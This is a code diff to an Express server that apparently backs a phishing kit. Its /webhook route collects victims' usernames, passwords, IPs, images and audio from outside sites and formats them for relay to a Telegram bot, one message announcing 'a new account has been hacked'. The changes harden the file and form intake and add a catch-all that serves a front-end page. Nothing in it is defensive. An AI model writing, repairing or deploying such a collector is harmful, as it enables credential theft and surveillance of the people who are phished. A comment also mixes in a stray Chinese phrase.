@@ -16,7 +16,7 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// تكوين multer للتعامل مع رفع الملفات (الذاكرة المؤقتة)
+// تكوين multer للتعامل مع رفع الملفات
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
@@ -99,8 +99,8 @@ function getMimeType(filename) {
 
 // ========== Routes لـ Telegram Bot ==========
 
-// نقطة النهاية الرئيسية لاستقبال البيانات من المواقع (بدون معرفة رابط السيرفر)
-app.post('/webhook', async (req, res) => {
+// نقطة النهاية الرئيسية لاستقبال البيانات من المواقع
+app.post('/webhook', upload.any(), async (req, res) => {
   try {
     const { 
       type,           // نوع البيانات: 'login', 'register', 'image', 'audio', etc.
@@ -125,7 +125,7 @@ app.post('/webhook', async (req, res) => {
     // معالجة不同类型的 البيانات
     switch (type) {
       case 'login':
-        const { username, password, amount, device } = data;
+        const { username, password, amount, device } = typeof data === 'string' ? JSON.parse(data) : data;
         const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'غير معروف';
         
         message = `♦️ - تم اختراق حساب جديد 
@@ -138,7 +138,7 @@ app.post('/webhook', async (req, res) => {
         break;
 
       case 'register':
-        const { user, pass, ip } = data;
+        const { user, pass, ip } = typeof data === 'string' ? JSON.parse(data) : data;
         message = `📝 تسجيل حساب جديد
 👤 اسم المستخدم: ${user}
 🔐 كلمة المرور: ${pass}
@@ -147,8 +147,8 @@ app.post('/webhook', async (req, res) => {
         break;
 
       case 'image':
-        if (req.files && req.files.image) {
-          fileBuffer = req.files.image.data;
+        if (req.files && req.files.length > 0) {
+          fileBuffer = req.files[0].buffer;
           filename = `image-${Date.now()}.jpg`;
           isImage = true;
         }
@@ -157,8 +157,8 @@ app.post('/webhook', async (req, res) => {
         break;
 
       case 'audio':
-        if (req.files && req.files.audio) {
-          fileBuffer = req.files.audio.data;
+        if (req.files && req.files.length > 0) {
+          fileBuffer = req.files[0].buffer;
           filename = `audio-${Date.now()}.mp3`;
         }
         message = `🎵 تم تسجيل صوت جديد\n👤 المستخدم: ${data.username || 'غير معروف'}`;
@@ -262,27 +262,39 @@ app.post('/upload-image', upload.single('image'), async (req, res) => {
   }
 });
 
-// نقطة النهاية للتحقق من عمل السيرفر
-app.get('/health', (req, res) => {
-  res.status(200).json({ 
-    success: true,
-    status: 'Server is running',
-    tokenConfigured: !!BOT_TOKEN
-  });
-});
-
 // Route رئيسي بسيط
 app.get('/', (req, res) => {
   res.status(200).json({ 
     success: true,
     message: 'مرحباً بك في سيرفر Telegram Bot',
-    webhook: 'استخدم /webhook لإرسال البيانات'
+    endpoints: {
+      webhook: 'POST /webhook',
+      sendMessage: 'POST /send-to-telegram',
+      uploadImage: 'POST /upload-image',
+      health: 'GET /health'
+    }
   });
+});
+
+// نقطة النهاية للتحقق من عمل السيرفر
+app.get('/health', (req, res) => {
+  res.status(200).json({ 
+    success: true,
+    status: 'Server is running',
+    tokenConfigured: !!BOT_TOKEN,
+    timestamp: new Date().toISOString()
+  });
+});
+
+// خدمة الملفات الثابتة من مجلد public
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // بدء السيرفر
 app.listen(PORT, () => {
   console.log(`✅ Server is running on port ${PORT}`);
+  console.log(`📁 Serving static files from: ${path.join(__dirname, 'public')}`);
   if (!BOT_TOKEN) {
     console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
   }
